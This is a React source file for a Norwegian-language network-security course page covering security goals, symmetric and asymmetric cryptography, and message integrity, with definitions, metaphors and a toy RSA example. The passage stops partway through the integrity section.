import { useState } from "react";
import { SiteHeader } from "@/components/SiteHeader";
import { Button } from "@/components/ui/button";
import {
  BookOpen,
  ChevronDown,
  ChevronRight,
  ArrowLeft,
  ArrowRight,
  FolderOpen,
  ExternalLink,
} from "lucide-react";
import { SectionPager, type SectionNavItem } from "./SectionPager";
import { Section81Live } from "./Section81Live";
import { Section82Live } from "./Section82Live";
import { Section83Live } from "./Section83Live";
import { Section84Live } from "./Section84Live";
import { Section85Live } from "./Section85Live";
import { Section86Live } from "./Section86Live";
import { Section87Live } from "./Section87Live";
import { Section88Live } from "./Section88Live";
import { VisualDefs } from "./VisualDefs";
import {
  ConfidentialityIcon,
  IntegrityIcon,
  AuthEndpointIcon,
  AvailabilityIcon,
  ThreatModelIcon,
  AliceBobTrudyIcon,
  DefenseDepthIcon,
  NonRepudiationIcon,
  AuthorizationIcon,
  PrivacyIcon,
  MetadataLeakIcon,
  PassiveActiveIcon,
  InsiderIcon,
  SymmetricKeyIcon,
  AesIcon,
  CipherModeIcon,
  AsymmetricKeyIcon,
  RsaIcon,
  EccIcon,
  DiffieHellmanIcon,
  HybridIcon,
  BlockStreamIcon,
  EcbIcon,
  CbcIcon,
  CtrIcon,
  GcmIcon,
  IvNonceIcon,
  AeadIcon,
  PaddingIcon,
  KeyLengthIcon,
  ChaChaIcon,
  KerckhoffsIcon,
  PostQuantumIcon,
  HashIcon,
  HashWeakIcon,
  MacIcon,
  HmacIcon,
  DigitalSignatureIcon,
  ReplayAttackIcon,
  PreimageIcon,
  CollisionIcon,
  Sha2Sha3Icon,
  LengthExtensionIcon,
  SignAlgoIcon,
  TimestampIcon,
  NameOnlyIcon,
  PasswordClearIcon,
  NonceIcon,
  ChallengeResponseIcon,
  MitmIcon,
  CertificateIcon,
  PkiIcon,
  RevokeIcon,
  X509FieldsIcon,
  CertExtensionIcon,
  ValidationLevelIcon,
  ChainOfTrustIcon,
  CrlIcon,
  OcspStaplingIcon,
  CtLogIcon,
  MtlsIcon,
  MfaIcon,
  TlsRecordIcon,
  HandshakeIcon,
  CipherSuiteIcon,
  ForwardSecrecyIcon,
  MasterSecretIcon,
  SessionResumptionIcon,
  Tls13Icon,
  ClientHelloIcon,
  ServerHelloIcon,
  FinishedMacIcon,
  ZeroRttIcon,
  HkdfIcon,
  DowngradeIcon,
  QuicIcon,
  AlpnIcon,
  AhIcon,
  EspIcon,
  TransportModeIcon,
  TunnelModeIcon,
  SaIcon,
  IkeIcon,
  AntiReplayIcon,
  SpiIcon,
  SadSpdIcon,
  Ikev2PhasesIcon,
  NatTraversalIcon,
  WireguardIcon,
  SiteToSiteIcon,
  SplitTunnelIcon,
  StatelessFilterIcon,
  StatefulFilterIcon,
  DefaultDenyIcon,
  ImplicitDenyIcon,
  AppFirewallIcon,
  TunnelSmugglingIcon,
  EgressIcon,
  ConntrackIcon,
  NgfwIcon,
  WafIcon,
  DmzIcon,
  ZeroTrustIcon,
  IptablesIcon,
  IdsIcon,
  IpsIcon,
  SignatureBasedIcon,
  AnomalyBasedIcon,
  DpiIcon,
  FpFnIcon,
  SnortIcon,
  NidsHidsIcon,
  SpanPortIcon,
  NetworkTapIcon,
  PrecisionIcon,
  AlertFatigueIcon,
  EdrIcon,
  SiemIcon,
  HoneypotIcon,
  TlsBlindIcon,
  KillChainIcon,
  XssIcon,
  XssDefenseIcon,
  CsrfIcon,
  CsrfDefenseIcon,
  SqlInjectionIcon,
  SqlDefenseIcon,
  OwaspIcon,
  StoredXssIcon,
  ReflectedXssIcon,
  DomXssIcon,
  CspIcon,
  SameSiteIcon,
  CsrfTokenIcon,
  BlindSqliIcon,
  PreparedStmtIcon,
  SsrfIcon,
  PathTraversalIcon,
  ClickjackingIcon,
  SriIcon,
} from "./visualDefIcons.kap8";

type Tab =
  | "intro"
  | "8.1"
  | "8.2"
  | "8.3"
  | "8.4"
  | "8.5"
  | "8.6"
  | "8.7"
  | "8.8"
  | "8.9"
  | "8.10"
  | "8.11";

const SECTIONS_8: SectionNavItem[] = [
  { id: "intro", label: "Start her" },
  { id: "8.1", label: "8.1 Hva er sikkerhet?" },
  { id: "8.2", label: "8.2 Kryptografi" },
  { id: "8.3", label: "8.3 Integritet" },
  { id: "8.4", label: "8.4 Autentisering" },
  { id: "8.5", label: "8.5 TLS" },
  { id: "8.6", label: "8.6 IPsec & VPN" },
  { id: "8.7", label: "8.7 Brannmurer" },
  { id: "8.8", label: "8.8 IDS & IPS" },
  { id: "8.9", label: "8.9 Web-angrep" },
  { id: "8.10", label: "8.10 Oppgaver" },
  { id: "8.11", label: "Eksamen-fokus" },
];
const NEXT_CHAPTER_8 = { slug: "kurose-kap-9", title: "Multimedia-nettverk" };

export function KuroseKap8Page() {
  const [tab, setTab] = useState<Tab>("intro");
  return (
    <div className="min-h-screen bg-background">
      <SiteHeader />
      <main className="container mx-auto px-4 py-4 max-w-6xl">
        <div className="mb-3 flex items-center flex-wrap gap-x-3 gap-y-1 border-b border-border pb-1.5">
          <div className="flex items-center gap-1.5 text-xs text-muted-foreground min-w-0">
            <a
              href="/stack/dte-2507"
              className="inline-flex items-center gap-1 hover:text-foreground shrink-0"
            >
              <FolderOpen className="h-3 w-3" /> DTE-2507
            </a>
            <span>·</span>
            <a href="/stack/kurose-kurs" className="hover:text-foreground shrink-0">
              Kurose-kurset
            </a>
            <span>·</span>
            <h1 className="text-sm font-bold tracking-tight text-foreground truncate">
              Kap. 8 — Sikkerhet i nettverk
            </h1>
          </div>
          <nav className="ml-auto flex flex-wrap gap-0.5">
            <TabBtn active={tab === "intro"} onClick={() => setTab("intro")}>
              Start
            </TabBtn>
            <TabBtn active={tab === "8.1"} onClick={() => setTab("8.1")} title="Hva er sikkerhet?">
              8.1
            </TabBtn>
            <TabBtn active={tab === "8.2"} onClick={() => setTab("8.2")} title="Kryptografi">
              8.2
            </TabBtn>
            <TabBtn active={tab === "8.3"} onClick={() => setTab("8.3")} title="Integritet">
              8.3
            </TabBtn>
            <TabBtn active={tab === "8.4"} onClick={() => setTab("8.4")} title="Autentisering">
              8.4
            </TabBtn>
            <TabBtn active={tab === "8.5"} onClick={() => setTab("8.5")} title="TLS">
              8.5
            </TabBtn>
            <TabBtn active={tab === "8.6"} onClick={() => setTab("8.6")} title="IPsec & VPN">
              8.6
            </TabBtn>
            <TabBtn active={tab === "8.7"} onClick={() => setTab("8.7")} title="Brannmurer">
              8.7
            </TabBtn>
            <TabBtn active={tab === "8.8"} onClick={() => setTab("8.8")} title="IDS & IPS">
              8.8
            </TabBtn>
            <TabBtn active={tab === "8.9"} onClick={() => setTab("8.9")} title="Web-angrep">
              8.9
            </TabBtn>
            <TabBtn active={tab === "8.10"} onClick={() => setTab("8.10")} title="Oppgaver">
              Oppg.
            </TabBtn>
            <TabBtn
              active={tab === "8.11"}
              onClick={() => setTab("8.11")}
              title="Eksamen-fokus: cheat sheet, sammenligning, beslutningstre, fallgruver, anker"
            >
              Eksamen
            </TabBtn>
          </nav>
        </div>

        {tab === "intro" && <Intro onPick={setTab} />}
        {tab === "8.1" && <Section81 />}
        {tab === "8.2" && <Section82 />}
        {tab === "8.3" && <Section83 />}
        {tab === "8.4" && <Section84 />}
        {tab === "8.5" && <Section85 />}
        {tab === "8.6" && <Section86 />}
        {tab === "8.7" && <Section87 />}
        {tab === "8.8" && <Section88 />}
        {tab === "8.9" && <Section89 />}
        {tab === "8.10" && <Section810 />}
        {tab === "8.11" && <SectionEksamen />}

        <SectionPager
          tabs={SECTIONS_8}
          current={tab}
          onPick={(id) => setTab(id as Tab)}
          nextChapter={NEXT_CHAPTER_8}
        />
      </main>
    </div>
  );
}

function TabBtn({
  children,
  active,
  onClick,
  title,
}: {
  children: React.ReactNode;
  active: boolean;
  onClick: () => void;
  title?: string;
}) {
  return (
    <button
      onClick={onClick}
      title={title}
      className={`rounded px-2 py-1 text-xs font-medium transition-colors ${
        active
          ? "bg-brand/15 text-brand"
          : "text-muted-foreground hover:bg-muted hover:text-foreground"
      }`}
    >
      {children}
    </button>
  );
}

function Intro({ onPick }: { onPick: (t: Tab) => void }) {
  return (
    <div className="grid gap-3 sm:grid-cols-2 text-sm">
      <div className="rounded-xl border border-border bg-card p-4">
        <h2 className="text-base font-semibold mb-2 flex items-center gap-2">
          <BookOpen className="h-4 w-4" /> Læringsmål
        </h2>
        <ul className="list-disc pl-5 text-muted-foreground space-y-1">
          <li>
            Definere de fire sikkerhetsmålene — konfidensialitet, integritet, autentisering,
            tilgjengelighet — og kjenne igjen hvilket mål en gitt angreps-form bryter.
          </li>
          <li>
            Forklare forskjellen på symmetrisk og asymmetrisk kryptografi, og når man trenger
            hvilken.
          </li>
          <li>
            Bruke hash-funksjoner, MAC og HMAC til å oppdage tukling, og forklare hvorfor en ren
            hash ikke er nok.
          </li>
          <li>Tegne en TLS-handshake og peke på hvor nøklene faktisk dannes.</li>
          <li>Skille mellom IPsec transport-mode og tunnel-mode, og mellom AH og ESP.</li>
          <li>
            Skrive enkle pakkefilter-regler, og forklare hvorfor stateful er bedre enn stateless.
          </li>
          <li>
            Gjenkjenne XSS, CSRF og SQL-injeksjon i koden, og vite hvilket forsvar som faktisk
            virker for hver av dem.
          </li>
        </ul>
      </div>

      <div className="rounded-xl border border-border bg-card p-4">
        <h2 className="text-base font-semibold mb-2">Kapittelets struktur</h2>
        <ol className="list-decimal pl-5 text-muted-foreground space-y-1">
          <li>Hva sikkerhet i nettverk faktisk betyr</li>
          <li>Kryptografiens to verktøy — symmetrisk og asymmetrisk</li>
          <li>Meldings-integritet — hash, MAC, signering</li>
          <li>Endepunkts-autentisering — nonce og sertifikater</li>
          <li>TLS — hvordan nettlesere snakker trygt</li>
          <li>IPsec og VPN — sikkerhet på nettverkslaget</li>
          <li>Brannmurer — hvem som slipper inn</li>
          <li>IDS og IPS — å oppdage innbrudd</li>
          <li>Web-angrep — XSS, CSRF, SQL-injeksjon</li>
          <li>Oppgaver — fem stykker som binder alt sammen</li>
        </ol>
        <div className="mt-3 flex gap-2">
          <Button size="sm" onClick={() => onPick("8.1")}>
            Start på 8.1 →
          </Button>
        </div>
      </div>

      <div className="rounded-xl border border-amber-500/30 bg-amber-500/5 p-4">
        <div className="text-[10px] uppercase tracking-wider text-amber-700 dark:text-amber-400 font-semibold mb-1">
          Lese-tips
        </div>
        <p className="text-muted-foreground text-[13px]">
          Sikkerhet er et stort domene, men nesten alt vi bruker i praksis er bygd på en håndfull
          byggeklosser. Hvis du holder fokus på de fire målene fra 8.1 gjennom hele kapittelet, og
          hele tiden spør «hvilket mål dekker denne mekanismen?», hjelper rammeverket deg å
          organisere alt.
        </p>
      </div>
    </div>
  );
}

// ============================================================
// 8.1 — Hva er nettverkssikkerhet
// ============================================================
function Section81() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.1" title="Hva er nettverkssikkerhet?" />

      <p className="text-muted-foreground">
        Når vi snakker om at en kommunikasjon er «sikker», mener vi vanligvis fire ting samtidig.
        Ingen av dem dekkes av et enkelt verktøy — du må stable flere mekanismer for å oppnå alle
        fire. Vi starter med å definere rammeverket før vi går løs på selve verktøyene.
      </p>

      <Section81Live />

      <div className="grid gap-3 lg:grid-cols-2">
        <VisualDefs
          items={[
            { term: "Konfidensialitet", icon: <ConfidentialityIcon />, body: "Bare A og B leser innholdet — krypter." },
            { term: "Meldings-integritet", icon: <IntegrityIcon />, body: "Ingen bit endret underveis — MAC/signering." },
            {
              term: "Endepunkts-autentisering",
              icon: <AuthEndpointIcon />,
              body: "Du snakker med rett part — sertifikat + nonce.",
            },
            {
              term: "Operasjonell tilgjengelighet",
              icon: <AvailabilityIcon />,
              body: "Tjenesten lever — rate-limit, scrubbing.",
            },
            { term: "Trussel-modell", icon: <ThreatModelIcon />, body: "Eksplisitt liste over hva angriper kan/ikke kan." },
            { term: "Alice, Bob, Trudy", icon: <AliceBobTrudyIcon />, body: "Standard-navn: to legitime parter + angriper." },
            { term: "Defense in depth", icon: <DefenseDepthIcon />, body: "Flere lag forsvar — én feil knekker ikke alt." },
            {
              term: "Ikke-avvisning",
              icon: <NonRepudiationIcon />,
              body: "Avsender kan ikke nekte — krever signering, ikke MAC.",
            },
            { term: "Autorisasjon vs autentisering", icon: <AuthorizationIcon />, body: "«Hvem er du» vs «hva får du gjøre»." },
            {
              term: "Personvern vs konfidensialitet",
              icon: <PrivacyIcon />,
              body: "Personvern er bredere: hvilke data samles.",
            },
            { term: "Metadata-lekkasje", icon: <MetadataLeakIcon />, body: "Krypto skjuler innhold, ikke hvem/når." },
            { term: "Passiv vs aktiv angriper", icon: <PassiveActiveIcon />, body: "Lytter / endrer-sletter-injiserer." },
            {
              term: "Insider-trussel",
              icon: <InsiderIcon />,
              body: "Ansatt med legitim tilgang — perimeter ser ikke det.",
            },
          ]}
        />
        <Illustration caption="De fire målene som tilsammen utgjør «sikker kommunikasjon». Ingen av dem leveres gratis — hver krever sin egen mekanisme.">
          <FourGoalsSvg />
        </Illustration>
      </div>

      <div className="grid gap-3 md:grid-cols-2">
        <Metafor tittel="CIA-triaden er et bankhvelv">
          <p>
            Konfidensialitet: ingen ser pengene gjennom døra. Integritet: ingen endrer beløpet på
            kontoutskriften. Tilgjengelighet: banken er åpen når du trenger den. Tre uavhengige
            egenskaper — den ene gir ikke gratis de andre.
          </p>
        </Metafor>
        <Metafor tittel="Defense in depth er et middelaldersk slott">
          <p>
            Vollgrav, ytre mur, indre mur, donjon. En angriper som har tatt vollgraven, har ikke
            tatt slottet. Brannmur er vollgraven; kryptering, autentisering og tilgangsstyring er
            innerveggene. Hver gir en uavhengig sjanse til å stoppe ham.
          </p>
        </Metafor>
        <Metafor tittel="Ikke-avvisning er en notarius-signatur">
          <p>
            En MAC er som at både du og jeg har samme stempel — vi kan begge stemple en sjekk, så
            ingen kan bevise at det var DU som signerte. En digital signatur er som en notarius:
            bare DU har det unike notarius-stemplet, så du kan ikke senere nekte for at det var deg.
          </p>
        </Metafor>
      </div>

      <Illustration caption="CIA-triaden som Venn: konfidensialitet, integritet, tilgjengelighet er uavhengige mål. AEAD-modus (GCM) er en sjelden teknikk som dekker C ∩ I i én operasjon.">
        <CiaVennSvg />
      </Illustration>

      <Hvorfor title="Hvorfor skille mellom autentisering og integritet?">
        <p>
          De henger sammen — en gyldig MAC tyder på at meldingen ikke er endret OG at avsender hadde
          nøkkelen — men de adresserer ulike trusler. Integritet handler om at innholdet er uendret;
          autentisering handler om at avsender er den du tror. En klassisk feil er å kryptere uten å
          autentisere: angriper kan ikke lese, men kan fortsatt flippe bit i en CTR-cipher og dermed
          manipulere klarteksten. Derfor er det ikke nok å bare ha konfidensialitet; AEAD-modus
          (GCM, ChaCha20-Poly1305) sørger for at begge mål dekkes i én operasjon.
        </p>
      </Hvorfor>

      <Illustration caption="Passiv lytter ser bytene; aktiv angriper kan endre, slette og injisere — krever helt ulike forsvar.">
        <PassiveActiveSvg />
      </Illustration>

      <Example title="Eksempel: hvilket mål brytes?">
        <ul className="list-disc pl-5 space-y-1">
          <li>
            Angriperen sniffer trafikken på et åpent café-WiFi og leser e-postene dine. → bryter{" "}
            <strong>konfidensialitet</strong>.
          </li>
          <li>
            Angriperen flipper et bit i en banktransaksjon så «overfør 100 kr» blir «overfør 900
            kr». → bryter <strong>integritet</strong>.
          </li>
          <li>
            Angriperen later som han er nettbanken og lurer deg til å taste inn koden. → bryter{" "}
            <strong>autentisering</strong>.
          </li>
          <li>
            Angriperen oversvømmer nettbanken med så mye trafikk at andre kunder ikke kommer inn. →
            bryter <strong>tilgjengelighet</strong>.
          </li>
        </ul>
        <p className="mt-2 text-muted-foreground">
          Resten av kapittelet handler om hvilke verktøy som forsvarer mot hva.
        </p>
      </Example>

      <RelatedSlugs slugs={["nettverkssikkerhet"]} />
    </article>
  );
}

// ============================================================
// 8.2 — Kryptografi
// ============================================================
function Section82() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.2" title="Kryptografi-prinsipper" />

      <Section82Live />

      <p className="text-muted-foreground">
        Kryptografi gir oss konfidensialitet (og som vi skal se senere — andre mål også). Det finnes
        to fundamentalt forskjellige paradigmer: symmetrisk krypto, der begge parter har samme
        hemmelige nøkkel, og asymmetrisk, der hver part har et nøkkel-par. De løser ulike problemer
        og brukes alltid i kombinasjon i moderne protokoller.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <VisualDefs
          items={[
            { term: "Symmetrisk kryptografi", icon: <SymmetricKeyIcon />, body: "Samme nøkkel K på begge sider — rask AES." },
            { term: "AES", icon: <AesIcon />, body: "Symmetrisk standard, 128-bits blokk, 128/192/256-bits nøkler." },
            {
              term: "Drifts-modus (CBC, CTR, GCM)",
              icon: <CipherModeIcon />,
              body: "Hvordan kjede blokker — GCM er førstevalg.",
            },
            {
              term: "Asymmetrisk kryptografi",
              icon: <AsymmetricKeyIcon />,
              body: "Nøkkel-par: offentlig krypterer, privat dekrypterer.",
            },
            { term: "RSA", icon: <RsaIcon />, body: "Asymmetrisk — bygger på faktorisering, 2048+ bits." },
            { term: "ECC", icon: <EccIcon />, body: "Elliptiske kurver — kortere nøkler, samme styrke." },
            {
              term: "Diffie-Hellman",
              icon: <DiffieHellmanIcon />,
              body: "Felles hemmelighet over åpen kanal, uten å sende den.",
            },
            { term: "Hybrid-system", icon: <HybridIcon />, body: "Asym deler nøkkel, sym krypterer dataene." },
            {
              term: "Blokk- vs strøm-cipher",
              icon: <BlockStreamIcon />,
              body: "Faste blokker vs nøkkel-strøm XOR-et på input.",
            },
            { term: "ECB-modus", icon: <EcbIcon />, body: "Naiv per-blokk — lekker mønstre, BRUK ALDRI." },
            { term: "CBC-modus", icon: <CbcIcon />, body: "Kjeder med XOR — krever IV og separat MAC." },
            { term: "CTR-modus", icon: <CtrIcon />, body: "Krypterer en teller, XOR-er ut — fullt parallelt." },
            { term: "GCM-modus", icon: <GcmIcon />, body: "AEAD: CTR + autentiserings-tag, én operasjon." },
            { term: "IV / nonce", icon: <IvNonceIcon />, body: "Unik per (nøkkel, melding) — hindrer mønster." },
            { term: "AEAD", icon: <AeadIcon />, body: "Krypter OG autentiser i én primitiv (GCM, ChaCha20-Poly1305)." },
            {
              term: "Padding (PKCS#7)",
              icon: <PaddingIcon />,
              body: "Fyller siste blokk — feil sjekk gir padding-oracle.",
            },
            { term: "Nøkkellengde og 2^N", icon: <KeyLengthIcon />, body: "128-bit = 2^128 nøkler, brute-force umulig." },
            { term: "ChaCha20-Poly1305", icon: <ChaChaIcon />, body: "AEAD uten AES-hardware — favoritt på mobil." },
            {
              term: "Kerckhoffs' prinsipp",
              icon: <KerckhoffsIcon />,
              body: "Sikkerhet skal ligge i nøkkelen, ikke algoritmen.",
            },
            {
              term: "Post-kvante-krypto",
              icon: <PostQuantumIcon />,
              body: "Gitter-baserte algoritmer mot fremtidige kvante-PC-er.",
            },
          ]}
        />
        <Illustration caption="Symmetrisk vs asymmetrisk flyt. Til venstre samme nøkkel begge veier; til høyre offentlig kryptering, privat dekryptering.">
          <SymVsAsymSvg />
        </Illustration>
      </div>

      <div className="grid gap-3 md:grid-cols-2">
        <Metafor tittel="Symmetrisk nøkkel er husnøkkelen">
          <p>
            Samme nøkkel låser og åpner. Trygt — så lenge ingen kopierer den. Men hvordan får du
            nøkkelen til en venn i Bergen som du aldri har møtt? Du kan ikke poste den åpent. Det er
            nøkkel-distribusjons-problemet.
          </p>
        </Metafor>
        <Metafor tittel="Asymmetrisk er en postkasse">
          <p>
            Alle kan slippe et brev inn (offentlig nøkkel — sleifa er åpen). Men bare DU har
            nøkkelen til å åpne postkassen og lese (privat nøkkel). Du kan til og med trykke en
            stempel «her er sleifa-åpningen min» på dronning Gates' offentlige nettside, og
            allikevel er det bare DU som kan lese det som blir lagt inn.
          </p>
        </Metafor>
        <Metafor tittel="Diffie-Hellman er to malingbøtter">
          <p>
            Alice og Bob har hver sin lille pott med privat farge. De har en felles startfarge
            (gul). Begge blander pott + startfarge og sender den blandede fargen åpent over. Når de
            igjen mikser inn sin egen private farge i motpartens, ender begge på nøyaktig samme
            slutt-blanding — men en tjuvlytter ser bare de halv-blandede fargene og kan ikke utlede
            det private bidraget.
          </p>
        </Metafor>
        <Metafor tittel="ECB-modus er en filt-stempel">
          <p>
            Tenk deg en stempel-arbeid der hvert ord erstattes med et eget stempel-tegn («ja» → ▲,
            «nei» → ●, «overfør» → ◆). Like ord blir like tegn. Et bilde av en pingvin forblir
            formet som en pingvin etter «kryptering». Det er hvorfor ECB lekker mønstre — og hvorfor
            du aldri skal bruke det utenfor lærebok-eksempler.
          </p>
        </Metafor>
      </div>

      <Hvorfor title="Hvorfor brukes hybrid krypto (asymmetrisk + symmetrisk) i praksis?">
        <p>
          Asymmetrisk krypto løser ett vanskelig problem som symmetrisk ikke kan: hvordan dele en
          nøkkel med noen du aldri har snakket med før, over en åpen kanal. Men prisen er stiv —
          RSA-2048-kryptering av en kilobyte tar tusenvis av ganger lengre enn AES-kryptering av
          samme kilobyte, fordi RSA innebærer modulær eksponentiasjon over store tall mens AES er
          enkle bit-operasjoner som CPU-en har i hardware.
        </p>
        <p>
          Hybrid-mønsteret bruker derfor hver primitiv til det den er god på: asymmetrisk krypto
          eller DH frakter en liten symmetrisk nøkkel (typisk 32 byte) trygt fram, og deretter
          krypteres alle de tunge dataene med AES eller ChaCha20. Du betaler asymmetri-kostnaden én
          gang per sesjon, ikke per byte. Det er hjørnesteinen i TLS, SSH, S/MIME, Signal og
          praktisk talt all moderne transport-sikkerhet.
        </p>
      </Hvorfor>

      <Illustration caption="Diffie-Hellman: begge mikser sin private verdi med motpartens offentlige, og ender på samme delte hemmelighet uten å sende den.">
        <DhSvg />
      </Illustration>

      <Illustration caption="ECB lekker mønstre: like klartekst-blokker gir like ciphertext-blokker. CBC-kjede skjuler det.">
        <EcbVsCbcSvg />
      </Illustration>

      <Illustration caption="De fire AES-modi side-ved-side — bare ECB er usikker. GCM er førstevalg fordi den kombinerer konfidensialitet og integritet i én operasjon (AEAD).">
        <AesModesSvg />
      </Illustration>

      <Example title="Eksempel: hvorfor ikke bare bruke RSA hele veien?">
        <p>
          Tenk at Alice vil sende en 10 MB fil til Bob. Hvis hun krypterer alt med Bobs
          RSA-offentlige nøkkel direkte, må hun kjøre RSA over hele filen — som er ekstremt tregt og
          ineffektivt (RSA er designet for små blokker).
        </p>
        <p className="mt-2">
          Hybrid-løsning: Alice velger en tilfeldig AES-nøkkel K (128 bit), krypterer filen med
          AES-K (rask), og krypterer bare K med Bobs RSA-nøkkel (kort melding, akseptabel kostnad).
          Bob dekrypterer K med sin private RSA-nøkkel, så dekrypterer filen med AES-K.
        </p>
        <p className="mt-2 text-muted-foreground">
          Dette mønsteret — «pakk inn nøkkelen med asymmetrisk, dataene med symmetrisk» — er
          hjørnesteinen i TLS, S/MIME og nesten alle praktiske krypto-protokoller.
        </p>
      </Example>

      <Example title="Eksempel: RSA-kryptering steg for steg med små tall">
        <p>
          RSA hviler på at det er enkelt å multiplisere store primtall, men praktisk umulig å
          faktorisere produktet tilbake. Vi bruker pinlig små tall her bare for å se mekanikken;
          ekte RSA bruker 2048-bits primtall.
        </p>
        <ol className="list-decimal pl-5 mt-1 space-y-1">
          <li>
            Velg primtall p = 11, q = 17. Da er <code>n = p·q = 187</code> og
            <code> φ(n) = (p−1)(q−1) = 160</code>.
          </li>
          <li>
            Velg offentlig eksponent <code>e = 7</code> (relativt primtall til 160).
          </li>
          <li>
            Regn ut privat eksponent <code>d</code> slik at <code>e·d ≡ 1 (mod 160)</code>. Med
            utvidet Euklid gir det <code>d = 23</code>.
          </li>
          <li>
            Offentlig nøkkel = <code>(n, e) = (187, 7)</code>. Privat nøkkel =
            <code> (n, d) = (187, 23)</code>.
          </li>
          <li>
            Krypter melding <code>m = 88</code>: <code>c = m^e mod n = 88^7 mod 187 = 11</code>.
          </li>
          <li>
            Dekrypter: <code>m = c^d mod n = 11^23 mod 187 = 88</code>. Tilbake!
          </li>
        </ol>
        <p className="mt-2 text-muted-foreground">
          Hele sikkerheten ligger i at en angriper som ser <code>n = 187</code> og
          <code> e = 7</code> må faktorisere 187 tilbake til 11·17 for å gjenutlede d. Med 2048-bits
          n er den faktoriseringen utenfor rekkevidde for klassisk maskinvare.
        </p>
      </Example>

      <RelatedSlugs slugs={["kryptografi", "dte2507-rsa-mini", "dte2507-cbc-iv"]} />
    </article>
  );
}

// ============================================================
// 8.3 — Meldings-integritet
// ============================================================
function Section83() {
  return (
    <article className="space-y-4 text-sm">
      <Header num="8.3" title="Meldings-integritet — hash, MAC, signering" />

      <Section83Live />

      <p className="text-muted-foreground">
        Kryptering skjuler innholdet, men gir ingen garanti for at det ikke er blitt endret. I
        CTR-modus, for eksempel, kan en angriper flippe vilkårlige bit i klarteksten ved å flippe
        tilsvarende bit i ciphertext — selv uten å kunne lese den. Vi trenger derfor en separat
        mekanisme for integritet.
      </p>

      <div className="grid gap-3 lg:grid-cols-2">
        <VisualDefs
          items={[
            { term: "Kryptografisk hash", icon: <HashIcon />, body: "Fingeravtrykk: vilkårlig inn, kort fast ut." },
            {
              term: "Hash alene ikke nok",
              icon: <HashWeakIcon />,
              body: "Trudy kan bytte både m og h(m) — trenger nøkkel.",
            },
            { term: "MAC", icon: <MacIcon />, body: "Hash med delt nøkkel: t = MAC(K, m)." },
            { term: "HMAC", icon: <HmacIcon />, body: "Standard MAC-konstruksjon fra hvilken som helst hash." },
            { term: "Digital signering", icon: <DigitalSignatureIcon />, body: "Asymmetrisk MAC — bare privat nøkkel kan lage." },
            { term: "Signer hashen", icon: <DigitalSignatureIcon />, body: "RSA er treig; signer h(m), ikke hele m." },
            {
              term: "Replay-angrep",
              icon: <ReplayAttackIcon />,
              body: "Gammel gyldig melding sendt på nytt — bruk nonce/tid.",
            },
            { term: "Preimage-resistens", icon: <PreimageIcon />, body: "Gitt y, umulig å finne m med h(m) = y." },
            { term: "Second-preimage", icon: <PreimageIcon />, body: "Gitt m1, umulig å finne m2 med samme hash." },
            {
              term: "Kollisjons-resistens",
              icon: <CollisionIcon />,
              body: "Vanskelig å finne to vilkårlige m1, m2 — bursdag-paradokset.",
            },
            { term: "SHA-2 og SHA-3", icon: <Sha2Sha3Icon />, body: "Moderne hash-familier — SHA-3 er svamp-basert." },
            { term: "MD5 og SHA-1", icon: <HashWeakIcon />, body: "Brutt — aldri til sikkerhet, kun checksum." },
            { term: "Lengde-extension", icon: <LengthExtensionIcon />, body: "Hash(K‖m) er ikke MAC — bruk HMAC." },
            { term: "RSA-PSS / ECDSA / EdDSA", icon: <SignAlgoIcon />, body: "Signatur-algoritmer; EdDSA er mest robust." },
            {
              term: "Encrypt-then-MAC vs AEAD",
              icon: <AeadIcon />,
              body: "AEAD (GCM) lukker hele rekkefølge-klassen.",
            },
            { term: "Tidsstempel / teller", icon: <TimestampIcon />, body: "Alternativ til nonce mot replay." },
          ]}
        />
        <Illustration caption="Hash mapper vilkårlig input til et kort fingeravtrykk. Selv én flippet bit i input endrer hele hashen.">
          <HashSvg />
        </Illustration>
      </div>

      <div className="grid gap-3 md:grid-cols-2">
        <Metafor tittel="Hash er å smelte en istår">
          <p>
            Du tar en istår, smelter den til vann, og veier vannet. Du kan ALDRI gjenskape den
            originale formen på iståren ut fra vannet. Men hvis noen sender deg en ny istår og sier
            «dette er samme», kan du smelte den og sjekke om vekten matcher. Du verifiserer uten å
            kunne reversere — det er preimage-resistens.
          </p>
        </Metafor>
        <Metafor tittel="HMAC er en sjekk i en forsegla konvolutt">
          <p>
            En vanlig hash er som en checksum på en sjekk — alle kan regne den ut. En MAC er som å
            signere sjekken OG putte den i en konvolutt med ditt personlige segl. Uten segl
            (nøkkelen) kan ingen lage konvolutten — om noen tuklet med innholdet, ser du det med en
            gang fordi seglet ikke matcher.
          </p>
        </Metafor>
        <Metafor tittel="Bursdag-paradokset er en fest">
          <p>
            For at NOEN i en sal skal ha samme bursdag som deg, må salen ha ~183 personer (1/365 ⋅
            183 ≈ 50 %). Men for at TO HVEM SOM HELST i salen skal dele bursdag, holder det med ~23
            personer. Hash-kollisjon er det andre problemet — angriperen får velge begge sider av
            kollisjonen, så han trenger bare 2^(n/2) forsøk, ikke 2^n.
          </p>
        </Metafor>
        <Metafor tittel="Replay-angrep er en talk-back-radio">
          <p>
            Tenk en walkie-talkie der noen tar opp meldingen «åpne dør 3» og spiller den av senere.
            Selv om radioen er signert, gjenkjenner mottakeren bare lyden — ikke når den kom. Nonce
            er som å si «åpne dør 3, ærend-nummer 4711» — Trudy som spiller av igjen har feil
            ærend-nummer.
          </p>
        </Metafor>
      </div>

      <Hvorfor title="Hvorfor er kollisjons-resistens en lavere bar enn preimage-resistens?">
        <p>
          For en n-bits hash er brute-force på preimage (gitt en hash y, finn m) i størrelsesorden
          2^n — du må prøve halvparten av input-rommet før forventet treff. Men for kollisjoner
          (finn et par (m1, m2) med samme hash) er angriperens jobb mye lettere på grunn av{" "}
          <em>fødselsdag-paradokset</em>: i et rom med 23 personer er det 50 % sjanse for at to
          deler bursdag, ikke 50 % sjanse for at noen deler din bursdag.
        </p>
        <p>
          Generaliseringen sier at i en uniform fordeling over 2^n verdier vil du forvente en
          kollisjon etter ca. 2^(n/2) tilfeldige forsøk. Derfor er en 128-bits hash bare ekvivalent
          med 64-bits sikkerhet mot kollisjon — praktisk å brute-force i dag. Det er hvorfor SHA-256
          brukes der man trenger 128-bits kollisjons-sikkerhet (signering), mens SHA-128 aldri
          eksisterte som standard.
        </p>
      </Hvorfor>

      <Illustration caption="Hash-kjede: hver blokk lagrer hash av forrige. Endrer du én bit langt tilbake, brytes hele kjeden — grunnlaget for blockchain, Git og audit-logger.">
        <HashChainSvg />
      </Illustration>

